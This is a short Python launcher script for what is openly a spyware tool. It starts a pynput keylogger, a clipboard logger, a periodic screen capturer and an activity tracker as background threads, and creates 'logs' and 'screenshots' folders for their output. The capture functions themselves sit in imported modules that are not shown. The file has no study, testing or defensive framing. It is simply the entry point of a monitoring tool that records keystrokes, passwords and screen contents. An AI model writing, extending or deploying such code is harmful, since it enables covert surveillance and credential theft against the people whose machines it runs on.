import threading
from pynput import keyboard
from keyLogger import onPress
from clipBoard import logClipboard
from screenCapture import captureScreen
from activityTracker import trackActivity
import os

os.makedirs("logs", exist_ok=True)
os.makedirs("screenshots", exist_ok=True)

if __name__ == "__main__":
    # Start keylogger
    keyListener = keyboard.Listener(on_press=onPress)
    keyListener.start()

    # Start clipboard logger
    clipboardThread = threading.Thread(target=logClipboard)
    clipboardThread.daemon = True
    clipboardThread.start()

    # Start screen capture
    screenThread = threading.Thread(target=captureScreen)
    screenThread.daemon = True
    screenThread.start()

    # Start activity tracker
    activityThread = threading.Thread(target=trackActivity)
    activityThread.daemon = True
    activityThread.start()

    # Keep everything running
    keyListener.join()